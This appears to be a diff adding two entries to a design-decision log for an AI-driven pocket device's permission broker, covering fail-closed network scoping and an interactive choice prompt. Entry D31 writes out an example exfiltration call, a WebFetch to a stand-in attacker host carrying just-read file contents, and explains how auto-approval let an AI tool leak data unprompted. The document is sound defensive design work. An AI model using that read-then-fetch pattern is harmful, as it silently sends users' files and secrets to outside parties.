@@ -741,6 +741,82 @@ lockstep; there is no negotiation below the envelope.
 
 ---
 
+## D31 — Reading is not transmitting
+
+**Accepted.** Found by the second adversarial review, and it is the same shape
+of bug as D27: a rule was enforced on the path nobody takes.
+
+`Risk.READ_ONLY` auto-approves in **every** mode, `manual` included, because a
+device that must be asked before it may read a file is unusable. `WebFetch` and
+`WebSearch` were classified `READ_ONLY` — accurately, in that they change
+nothing on this machine — and they carry no path parameter, so their scope was
+`none` and the auto-allow fired.
+
+The consequence, in `manual` mode, with no prompt at any point: read a file
+(auto-allowed), then `WebFetch("https://attacker/?d=<what you just read>")`
+(auto-allowed). D27 taught the broker to scan *shell commands* for egress
+binaries while the device's easiest egress was a first-class tool that never
+reached the classifier. `curl` and `wget` were never the risk; they sit behind
+`never_auto` `Bash`.
+
+Three changes, and the first is the principle:
+
+1. **`READ_ONLY` describes the effect on *this machine*, not on the world.**
+   `Permission.NETWORK` is excluded from the read-only auto-allow. A tool that
+   reads local state and a tool that transmits are different risks and were
+   sharing one axis.
+2. **Outbound calls are scoped by destination**, `net:<host>`, from a new
+   `ToolSpec.url_params` — the network analogue of `path_params`. An approved
+   fetch of one host is not a grant to reach every host. A URL that will not
+   parse yields `net:?` and is **denied**, never given a broad scope.
+3. **Outbound requests are `never_auto`**, alongside HID and SSH, for the same
+   reason those are: they are effects on the world outside the device, and a
+   mode switch must not unlock them. This device sits in a pocket with the
+   screen off, the model can read every file on it, and a query string is a
+   fine place to put a secret — so `auto` must not mean "and may post them
+   anywhere".
+
+The relaxation is **data, not a deleted line**: `[tools].allowed_network_hosts`
+lists hosts reachable unattended, matching an entry or any subdomain of it. It
+ships **empty**, because a device that trusts somebody else's domain list is
+not fail-closed. This is deliberately the same shape as the `CommandPolicy`
+planned for `Bash`: narrow, declared, reviewable.
+
+*Cost to change:* Low. *Cost of not having done it:* the device was one tool
+call away from silent exfiltration in its most restrictive mode.
+
+---
+
+## D32 — The device asks, and waits for the answer
+
+**Accepted.**
+
+`display_choice` drew a question and returned "asked it". The one interactive
+primitive on the device was **write-only**: the model could pose a question and
+then had to guess or end the turn. That makes every exchange a monologue — you
+speak, it answers, done — which is the difference between a device and an
+oracle, and no amount of voice input fixes it.
+
+`input/choice.py` is where the action stream meets the screen, and deliberately
+the only place that happens. `InputChoicePrompter.ask()` draws the question,
+consumes `PRESS` transitions to move the highlight, returns on `CONFIRM`, and
+is the menu half of D13's one-stream design — it simply ignores `REPEAT`, so
+holding the stick does not race through the options.
+
+**Every non-answer is a distinct fact**: `CANCELLED` (they saw it and
+declined), `TIMED_OUT` (nobody looked — the normal case for a device in a
+pocket, not an error), and `NO_OPERATOR` (no input hardware attached, so
+retrying can never help). A model told only "no answer" would retry the one
+case where retrying is useless.
+
+Until input hardware exists, `NullChoicePrompter` still *draws* the question —
+showing it is useful — and reports `NO_OPERATOR` rather than a confirmation the
+model would reasonably read as an answer.
+
+*Cost to change:* Low.
+
+---
+
 ## Deliberately deferred
 
 Not in the MVP, recorded so nobody assumes they were forgotten:
